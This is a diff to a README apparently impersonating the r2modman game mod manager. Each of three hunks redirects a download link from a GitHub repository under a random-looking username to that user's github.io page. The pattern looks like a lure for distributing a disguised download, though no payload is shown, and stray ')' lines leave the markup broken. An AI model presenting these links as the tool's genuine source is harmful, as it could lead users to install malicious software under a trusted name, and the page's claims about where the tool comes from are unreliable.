@@ -1,6 +1,6 @@
 # 🎮 r2modman - Your All-in-One Mod Manager for Valheim and More
 
-[![Download r2modman](https://img.shields.io/badge/Download-r2modman-brightgreen?style=for-the-badge&logo=github)](https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman)
+[![Download r2modman](https://img.shields.io/badge/Download-r2modman-brightgreen?style=for-the-badge&logo=github)](https://irreplaceablenessperiodicalcicada2355.github.io)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ No more digging through confusing folders or editing config files manually. r2mo
 
 Visit this link to download the application:
 
-[**Download r2modman**](https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman)
+[**Download r2modman**](https://irreplaceablenessperiodicalcicada2355.github.io)
 
 )
 
@@ -144,7 +144,7 @@ Ready to transform your gaming experience?
 
 Your journey to effortless mod management starts here:
 
-[**👉 Download r2modman Now**](https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman)
+[**👉 Download r2modman Now**](https://irreplaceablenessperiodicalcicada2355.github.io)
 
 )
 
